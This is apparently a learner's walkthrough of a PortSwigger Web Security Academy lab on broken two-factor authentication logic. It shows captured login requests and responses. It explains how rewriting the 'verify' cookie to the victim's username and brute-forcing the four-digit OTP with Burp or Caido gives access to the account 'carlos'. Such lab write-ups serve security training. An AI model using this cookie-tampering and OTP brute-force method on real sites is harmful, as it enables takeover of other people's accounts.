## Lab 7 - 2FA broken logic
**End Goal** - Bypass 2FA and Access Carlo's Account Page.

---
### Analysis:  
We have:  
Our own Credentials - `wiener:peter`  
Victim Username - `carlos`  
  
The site has 2FA.  
  
- giving `wiener:peter` at login page (because correct credentials)-> 302 redirect to -> OTP Validation page.  
  
- After correct username and password, the server gave us redirect to validation page plus a `Set-Cookie: verify=wiener`  

This is the `Post Request` for username and password login.
```http
POST /login HTTP/1.1
Host: web-security-academy.net
Accept: text/html,application/xhtml+xml;
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: web-security-academy.net
Connection: keep-alive
Referer: web-security-academy.net/login
Cookie: session=GTXK8NSYNSn5eKSnnWraD95JgbAQSugN

username=wiener&password=peter
```  
This is it's Response.  
```http
HTTP/1.1 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=xPYmou8VH2sWB1fFPiPCZYHXI6mrjWjj; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0
```  
For the redirect it made an authomaic `Get Request` and sent the `verify=wiener` Cookie, and most probably from here it decides for which account it generates the OTP for.  

```http
GET /login2 HTTP/1.1
Host: web-security-academy.net
Accept: text/html,application/xhtml+xml;
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: web-security-academy.net/login
Connection: keep-alive
Cookie: session=xPYmou8VH2sWB1fFPiPCZYHXI6mrjWjj; verify=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```  
`So if we replace the cookie value here with another username and it generates a OTP for that username, we can just generate a OTP for an account that we don't even know the password of and just have to brute force the OTP and if we find a 302 then just take that OTP and use it to login as that user.`  
  
- So i just changed the `verify=wiener` cookie to `verify=carlos`  
- now the server generated an OTP for `Carlos`.  
- Then i just went to login page again or from the current request `GET /login2` itself we give random number in the OTP field and send it.  
- From the Burp/Caido you can send it to `repeater` and set `verify=carlos` and set the OTP sent in the body as payload position and set the range from `1000-9999` for 4 digit OTP pin.  
  
- After the 2000th request a spotted a 302 status code so i stopped the repeater and tried that payload, mine was `1651`, and i got logged in into Carlos's account.